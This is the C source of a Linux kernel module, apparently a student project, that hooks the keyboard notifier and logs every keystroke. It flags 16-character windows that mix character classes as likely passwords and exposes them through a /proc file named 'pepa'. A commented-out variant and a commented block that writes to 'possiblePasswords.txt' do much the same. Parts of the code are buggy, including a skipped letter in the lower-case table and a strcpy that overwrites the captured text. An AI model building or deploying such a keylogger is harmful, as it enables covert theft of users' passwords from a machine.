#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/keyboard.h>
#include <asm/io.h>
#include <linux/fs.h>

#define PROC_FILE_NAME "pepa"


char passwrite[100][16];//
char passbuffer[100 * 16];//
int keypress = 1;//
int passcount2 = 0;//
int ps = 0;//
bool needsWriting = false;


size_t tcount = 0;
unsigned long int lasttime;
struct notifier_block nb;


//check the function at the begn of the loop and make a continuous function
ssize_t read_proc(struct file* filp, char *buf, size_t count, loff_t *offp)
{
	if(keypress == 1){
		keypress = 0;
		sprintf(passbuffer, "%s", (char*)passwrite);
		strcpy(buf, passbuffer);
		return strlen(passbuffer);
	}
	return 0;
	//return strlen(passbuffer);
}
ssize_t write_proc(struct file* filp, char *buf, size_t count, loff_t * offp)
{
	/*if(needsWriting == true)
	{
		needsWriting = false;
		strcpy(buf, passcount2);
		//strcpy(buf, "\n");
		//return strlen(passcount2);
		//return strlen(passbuffer);
		//sprintf(passwrite, "%s", (char*)passcount2);
		//strcpy(buf, passcount2 + "\n");
		//return strlen(passcount2 + "\n");
	}
	return passcount2;
	//return strlen(passbuffer);
	*/
}
struct file_operations pfo = {
	read : read_proc,
	write: 0
};

char input[16] = {';',';',';',';',';',';',';',';',';',';',';',';',';',';',';','\0'};

void isPassword(char letter)
{
	char caps[26] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
	bool cap = false;
	char lower[26] = {'a','b','c','d','e','f','g','h','i','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y', 'z'};
	bool low = false;
	char symbols[23] = {'\\','/',',','-','.','[',']','!','@','#','$','%','^','&','*','(',')','+','?','{','}','_','~'};
	bool sym = false;
	char numbers[10] = {'0','1','2','3','4','5','6','7','8','9'};
	bool num = false;
	int i;
	int j;

	for(i = 1; i < 16; i++)
	{
		input[i-1] = input [i];
	}
	input[14] = letter;
	
	for (i = 0; i < 16; i++)
	{
		int curVal = input[i];
		for(j = 0; j < 26; j++)
		{
			if (curVal == caps[j])
			{
				cap = true;
			}
			else if (curVal == lower[j])
			{
				low = true;
			}
		}
		for(j = 0; j < 10; j++)
		{
			if (curVal == numbers[j])
			{
				num = true;
			}
		}
		for(j = 0; j < 23; j++)
		{
			if (curVal == symbols[j])
			{
				sym = true;
			}
		}

		if ((sym + num + low + cap) >= 3)
		{
			cap = false;
			low = false;
			num = false;
			sym = false;
			printk("Writing this into a file!\n");
			if (passcount2 > 99)
			{
				break;
			}
			strcpy(passwrite[passcount2], input);
			strcpy(passwrite[passcount2], "\n");
			needsWriting = true;
			passcount2++;
			//cpy_to_usr(buf, passbuffer, strlen(passbuffer));
/*
			write(passwrite);
			write(passbuffer);
			ps++;
			if(ps>15)
			{
				ps=0;
			}
			passcount2 += 1;
			i=1;
			FILE * fp;
			fp = fopen("Home/Desktop/possiblePasswords.txt","a");
			for(i = 0; i < 15; i++)
			{
				fprintf(fp, "%c", input[i]);
			}
			printk(fp, "%c \n", input[15]);
*/
		}
		else
		{
			printk("Something went wrong!\n");
			//input[passcount] = letter;		CHANGE
			/*
			printk("Total is: %d \n", (sym + num + low + cap));
			printk("Array is: %c %c %c \n", input[13], input[14], input[15]);
			printk("Letter is: %c \n", letter);
			*/
		}
	}

	

}

void checkCharacters(int button, int shift, int down)
{
	bool found=false;
	char letter;
	char check;
	check = (char)button;
	
	//found = false;
	if (down == 1 && shift == 0)
	{	
		//input[15] = 10;
		//strcpy(passwrite[passcount2],input);
		//curVal++;
		switch (button)
		{
			case 30:
				letter = 'a';
				found = true;
				break;
			case 48:
				letter = 'b';
				found = true;
				break;
			case 46:
				letter = 'c';
				found = true;
				break;
			case 32:
				letter = 'd';
				found = true;
				break;
			case 18:
				letter = 'e';
				found = true;
				break;
			case 33:
				letter = 'f';
				found = true;
				break;
			case 34:
				letter = 'g';
				found = true;
				break;
			case 35:
				letter = 'h';
				found = true;
				break;
			case 23:
				letter = 'i';
				found = true;
				break;
			case 36:
				letter = 'j';
				found = true;
				break;
			case 37:
				letter = 'k';
				found = true;
				break;
			case 38:
				letter = 'l';
				found = true;
				break;
			case 50:
				letter = 'm';
				found = true;
				break;
			case 49:
				letter = 'n';
				found = true;
				break;
			case 24:
				letter = 'o';
				found = true;
				break;
			case 25:
				letter = 'p';
				found = true;
				break;
			case 16:
				letter = 'q';
				found = true;
				break;
			case 19: 
				letter = 'r';
				found = true;
				break;
			case 31:
				letter = 's';
				found = true;
				break;
			case 20:
				letter = 't';
				found = true;
				break;
			case 22:
				letter = 'u';
				found = true;
				break;
			case 47:
				letter = 'v';
				found = true;
				break;
			case 17:
				letter = 'w';
				found = true;
				break;
			case 45:
				letter = 'x';
				found = true;
				break;
			case 21:
				letter = 'y';
				found = true;
				break;
			case 44:
				letter = 'z';
				found = true;
				break;
			case 2:
				letter = '1';
				found = true;
				break;
			case 3:
				letter = '2';
				found = true;
				break;
			case 4:
				letter = '3';
				found = true;
				break;
			case 5:
				letter = '4';
				found = true;
				break;
			case 6:
				letter = '5';
				found = true;
				break;
			case 7:
				letter = '6';
				found = true;
				break;
			case 8:
				letter = '7';
				found = true;
				break;
			case 9:
				letter = '8';
				found = true;
				break;
			case 10:
				letter = '9';
				found = true;
				break;
			case 11:
				letter = '0';
				found = true;
				break;
			case 43:
				letter = '\\';
				found = true;
				break;
			case 53:
				letter = '/';
				found = true;
				break;
			case 41:
				letter = '\'';
				found = true;
				break;
			case 51:
				letter = ',';
				found = true;
				break;
			case 12:
				letter = '-';
				found = true;
				break;
			case 52:
				letter = '.';
				found = true;
				break;
			case 26:
				letter = '[';
				found = true;
				break;
			case 27:
				letter = ']';
				found = true;
				break;
		}
		//printk("%c %d %c \n", check, button, letter);
		if (found == true)
		{
			printk("Going to check for passwords.\n");
			//printk(letter);
			isPassword(letter);
		}
		else
		{
			printk("Not checking for passwords.\n");
		}
	}
	else if (down == 1 && shift == 1)
	{	
		switch (button)
		{
			case 30:
				letter = 'A';
				found = true;
				break;
			case 48:
				letter = 'B';
				found = true;
				break;
			case 46:
				letter = 'C';
				found = true;
				break;
			case 32:
				letter = 'D';
				found = true;
				break;
			case 18:
				letter = 'E';
				found = true;
				break;
			case 33:
				letter = 'F';
				found = true;
				break;
			case 34:
				letter = 'G';
				found = true;
				break;
			case 35:
				letter = 'H';
				found = true;
				break;
			case 23:
				letter = 'I';
				found = true;
				break;
			case 36:
				letter = 'J';
				found = true;
				break;
			case 37:
				letter = 'K';
				found = true;
				break;
			case 38:
				letter = 'L';
				found = true;
				break;
			case 50:
				letter = 'M';
				found = true;
				break;
			case 49:
				letter = 'N';
				found = true;
				break;
			case 24:
				letter = 'O';
				found = true;
				break;
			case 25:
				letter = 'P';
				found = true;
				break;
			case 16:
				letter = 'Q';
				found = true;
				break;
			case 19: 
				letter = 'R';
				found = true;
				break;
			case 31:
				letter = 'S';
				found = true;
				break;
			case 20:
				letter = 'T';
				found = true;
				break;
			case 22:
				letter = 'U';
				found = true;
				break;
			case 47:
				letter = 'V';
				found = true;
				break;
			case 17:
				letter = 'W';
				found = true;
				break;
			case 45:
				letter = 'X';
				found = true;
				break;
			case 21:
				letter = 'Y';
				found = true;
				break;
			case 44:
				letter = 'Z';
				found = true;
				break;
			case 2:
				letter = '!';
				found = true;
				break;
			case 3:
				letter = '@';
				found = true;
				break;
			case 4:
				letter = '#';
				found = true;
				break;
			case 5:
				letter = '$';
				found = true;
				break;
			case 6:
				letter = '%';
				found = true;
				break;
			case 7:
				letter = '^';
				found = true;
				break;
			case 8:
				letter = '&';
				found = true;
				break;
			case 9:
				letter = '*';
				found = true;
				break;
			case 10:
				letter = '(';
				found = true;
				break;
			case 11:
				letter = ')';
				found = true;
				break;
			case 13:
				letter = '+';	
				found = true;
				break;
			case 53:
				letter = '?';
				found = true;
				break;
			case 26:
				letter = '{';
				found = true;
				break;
			case 27:
				letter = '}';
				found = true;
				break;
			case 12:
				letter = '_';
				found = true;
				break;
			case 41:
				letter = '~';
				found = true;
				break;
		}
		
		if (found == true)
		{
			printk("Going to check for passwords.\n");
			//printk(letter);
			isPassword(letter);
		}
		else
		{
			printk("Not checking for passwords.\n");
		}
	}
}

int kb_notifier_fn(struct notifier_block *nb, unsigned long action, void* data){
	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
	checkCharacters(kp->value, kp->shift, kp->down);
	keypress = 1;
	printk("You have = %i",ps);
	printk(" characters valid for a password\n");
	printk("action = %lu Key:  %d  Lights:  %d  Shiftmap:  %x Down:  %d \n Input:  %s \n", action,  kp->value, kp->ledstate, kp->shift, kp->down, input);
	if(action == 1 && kp->down)
		tcount++;

	return 0;
}

int init (void) {
	nb.notifier_call = kb_notifier_fn;
	register_keyboard_notifier(&nb);
	proc_create(PROC_FILE_NAME,0,NULL,&pfo);
	return 0;
}

void cleanup(void) {
	unregister_keyboard_notifier(&nb);
	remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE("GPL"); 
module_init(init);
module_exit(cleanup);


//Optional
/*

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/keyboard.h>
#include <asm/uaccess.h>
#include <asm/io.h>
#include <linux/slab.h>


#define PROC_FILE_NAME "pepe"
_Bool num=false;
_Bool cap=false;
_Bool low=false;
_Bool schar=false;

struct notifier_block nb;
int input[15];
int x=0;
int y=0;
char xWrite[100][15];
int keypress = 1;
char passbuffer[100*15];

char theArray[15];
int numbers[10]= {2,3,4,5,6,7,8,9,10,11};
int letters[26]= {16,17,18,19,20,21,22,23,24,25,30,31,32,33,34,35,36,37,38,44,45,46,47,48,49,50};
int Scharacters[7]= {26,27,39,40,51,52,53};


ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp) 
{
	if(keypress == 1)
	{
		keypress=0;
		sprintf(passbuffer, "%s", (char*)xWrite);
		strcpy(buf, passbuffer);
		return strlen(passbuffer);
	}
	return 0;
}



struct file_operations proc_fops = {
	read: read_simple,
	write: 0
};

int kb_notifier_fn(struct notifier_block *nb, unsigned long action, void* data){
	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
	int keypress = 1;
	//isPassword(kp->value);
	
	return 0;

	int curVal;
	int i;
	for (i = 0; i <= 15; i++)
	{
		curVal = (int)(theArray[i]);
		
		int q;
		for (q=0; q<=10; q++){
			if (curVal == numbers[q])
			{
				num = true;
				//p++;
				//p=p/p;
			}
		}
		int f;
		for (f=0; f<=26; f++){
			if(curVal == letters[f] && kp->shift == 1 && kp->down == 1)
			//if(curVal == letters[f])
			{
				cap = true;
				//p++;
				//p=p/p;
			}
			if(curVal == letters[f] && kp->shift == 0 && kp->down == 1)
			{
				low = true;
				//p++;
				//p=p/p;
			}

		}
		int j;
		for (j=0; j<=7; j++){
			if (curVal == Scharacters[j])
			{
				schar == true;
				//p++;
				//p=p/p;
			}
		}

		if((schar+cap + low+ num)>=3)
		{
			strncpy(passwrite[passcount2],curVal,16);
			strcpy(theArray,"good pasword");
			printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n  CurrValue %s\n", kp->value, kp->ledstate, kp->shift, theArray);
			
		}

	}
	

}

int init (void) {
	nb.notifier_call = kb_notifier_fn;
	register_keyboard_notifier(&nb);
	proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
	return 0;
}

void cleanup(void) {
	unregister_keyboard_notifier(&nb);
	// remove_proc_entry(PROC_FILE_NAME,NULL);
}



MODULE_LICENSE("GPL"); 
module_init(init);
module_exit(cleanup);


*/
//This project took an extensive amount of time and proc_file was a new concept hard to understand, but overall
//it was an enjoyable project.
//I also created some extra files like password.c that reads the password and it 
//tells you how many Cap letters, Low case, numbers and symbols your password have. Also tells you if it is a good password.
//The password.c program is working awesome with the example that I provided.
//Nevertheless I couldn't export the password to the c file.
//Hope everything goes smooth and please you!
//Tomas Venere, Delaney Jhones
